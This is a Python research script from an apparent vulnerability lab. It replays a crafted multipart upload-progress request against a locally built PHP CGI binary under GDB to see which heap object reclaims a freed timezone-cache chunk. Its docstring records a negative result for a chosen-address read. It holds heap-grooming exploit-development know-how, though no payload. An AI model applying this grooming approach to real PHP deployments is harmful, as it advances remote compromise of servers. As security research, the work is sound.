#!/usr/bin/env python3
"""Stage B: which object reuses the freed startup tzcache chunk?

Bounded negative experiment for the Stage A rung-4 claim. It replays the
committed splice-MID request under GDB with different query shapes and
multipart field shapes, then dumps the stale HashTable at the PRE-RINIT
decode warning (the second hit on the pointer captured at php_date.c:505).
The consumer computes

    nIndex = h | ht->nTableMask
    HT_HASH_EX(arData, nIndex) = ((uint32_t*)arData)[(int32_t)nIndex]

so a chosen-address read needs a real pointer at offset 16 (arData) AND a
zero or chosen mask at offset 12. Every shape tested gives one of two
occupants, never that combination:

  * a zend_string carrying a long query value: mask=0, arData=value length
    (small chosen integer) -> wild near-NULL read, SIGSEGV;
  * a real HashTable (short/nested query values, any POST field): valid
    small negative mask, real bucket pointer -> read lands in the table's
    own hash slots, no fault.

Other input channels (session data, other SAPIs) remain UNKNOWN. This is
a preserved negative, not proof about every possible 56-byte allocation.

Loopback only; all logs land in lab/build/evidence/stageB/.
"""
import importlib.util
import os
import pathlib
import re
import subprocess
import tempfile

ROOT = pathlib.Path(__file__).resolve().parents[2]
GROOM = ROOT / 'lab/repro/php2shell-stageA-groom.py'
spec = importlib.util.spec_from_file_location('groom', GROOM)
groom = importlib.util.module_from_spec(spec)
spec.loader.exec_module(groom)

PHP = ROOT / 'lab/build/php-8.4.27-plain/sapi/cgi/php-cgi'
OUT = ROOT / 'lab/build/evidence/stageB'

QUERIES = [
    'XXX=ABCDEFGHIJ',                  # long value -> zend_string occupant
    'XXX[]=ABCDEFGHIJ',
    'XXX[0]=ABCDEFGHIJ',
    'XXX[ABCDEFGHIJ]=1',               # short value -> HashTable occupant
    'XXX[ABC]=1',
    'ABCDEFGHIJ=XXX',
    'XXX[12345678901234567890]=1',     # chosen numeric key hash
    'XXX[a]=1&XXX[b]=2',               # larger table, mask=-4
    'XXX[0]=1&XXX[1]=2&XXX[2]=3&XXX[3]=4',
    '',                                # no query: benign baseline
]

POST_FIELDS = [
    ('none', None),
    ('long10', 'extra=ABCDEFGHIJ'),
    ('long24', 'extra=ABCDEFGHIJABCDEFGHIJABCD'),
    ('arraylong', 'extra[]=ABCDEFGHIJ'),
    ('nestedlong', 'extra[0]=ABCDEFGHIJ'),
    ('nestedshort', 'extra[ABCDEFGHIJ]=1'),
    ('longname', 'ABCDEFGHIJ=1'),
]


def run_post(php, base, extra, log):
    """Like groom.run_leg, but with one extra multipart field before rfc1867."""
    sess = base / 'sess'
    sess.mkdir()
    (sess / ('sess_' + groom.SID)).write_text(groom.SPLICE_MID)
    (base / 'worker.php').write_text('<?php echo "worker\\n";')
    parts = []
    if extra:
        parts.append('--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n'
                     % (groom.BOUNDARY, extra.split('=')[0], extra.split('=', 1)[1]))
    parts.append('--%s\r\nContent-Disposition: form-data; '
                 'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprog\r\n' % groom.BOUNDARY)
    parts.append('--%s\r\nContent-Disposition: form-data; name="file1"; '
                 'filename="a.txt"\r\n\r\n1\r\n' % groom.BOUNDARY)
    body = (''.join(parts) + '--%s--\r\n' % groom.BOUNDARY).encode()
    (base / 'body').write_bytes(body)

    env = dict(os.environ)
    env.update(USE_ZEND_ALLOC='0', USE_TRACKED_ALLOC='1',
               ASAN_OPTIONS='detect_leaks=0:abort_on_error=1',
               UBSAN_OPTIONS='halt_on_error=1:print_stacktrace=1',
               REDIRECT_STATUS='1', REQUEST_METHOD='POST', QUERY_STRING='',
               CONTENT_TYPE='multipart/form-data; boundary=' + groom.BOUNDARY,
               CONTENT_LENGTH=str(len(body)),
               SCRIPT_FILENAME=str(base / 'worker.php'),
               PATH_TRANSLATED=str(base / 'worker.php'),
               HTTP_COOKIE='PHPSESSID=' + groom.SID)
    args = [str(php), '-n', '-q',
            '-d', 'error_log=%s' % (base / 'error.log'),
            '-d', 'log_errors=1', '-d', 'display_errors=0',
            '-d', 'error_reporting=32767', '-d', 'date.timezone=Bogus/Zone',
            '-d', 'max_input_vars=1000', '-d', 'file_uploads=1',
            '-d', 'upload_max_filesize=1024',
            '-d', 'session.save_path=%s' % sess, '-d', 'session.name=PHPSESSID',
            '-d', 'session.use_strict_mode=0', '-d', 'session.cache_limiter=',
            '-d', 'session.save_handler=files', '-d', 'session.serialize_handler=php',
            '-d', 'session.upload_progress.enabled=1',
            '-d', 'session.upload_progress.cleanup=0',
            '-d', 'session.upload_progress.prefix=upload_progress_',
            '-d', 'session.upload_progress.name=PHP_SESSION_UPLOAD_PROGRESS',
            '-d', 'session.upload_progress.freq=1%',
            '-d', 'session.upload_progress.min_freq=0.000000001']
    args = ['gdb', '-q', '-batch', '-x', str(groom.GDB_PROBE), '--args'] + args
    log.write('extra=%r\n' % extra)
    log.flush()
    with open(base / 'body', 'rb') as fh:
        proc = subprocess.run(args, env=env, stdin=fh, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, timeout=60)
    log.write(proc.stdout.decode(errors='replace'))
    log.write('\nrc=%d\n' % proc.returncode)
    log.flush()
    return proc.returncode


def report(label, log):
    text = log.read_text(errors='replace')
    hits = re.findall(r'^STALE ht=.*$', text, re.M)
    fault = 'SIGSEGV' if 'Program received signal SIGSEGV' in text else '-'
    print('%-38s fault=%-7s %s' % (label, fault, hits[-1] if hits else 'NO HIT'))
    print('  log=%s' % log)


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    for query in QUERIES:
        tag = re.sub(r'[^A-Za-z0-9]', '_', query)[:32] or 'none'
        with tempfile.TemporaryDirectory(prefix='stageB-', dir=OUT) as tmp:
            log = OUT / ('occupant-%s.log' % tag)
            with log.open('w') as fh:
                groom.run_leg(PHP, pathlib.Path(tmp), 'splice-mid', query,
                              fh, use_gdb=True)
        report(query or '(none query)', log)
    for tag, extra in POST_FIELDS:
        with tempfile.TemporaryDirectory(prefix='postch-', dir=OUT) as tmp:
            log = OUT / ('post-%s.log' % tag)
            with log.open('w') as fh:
                run_post(PHP, pathlib.Path(tmp), extra, fh)
        report('POST %s' % (extra or '(none)'), log)


if __name__ == '__main__':
    main()
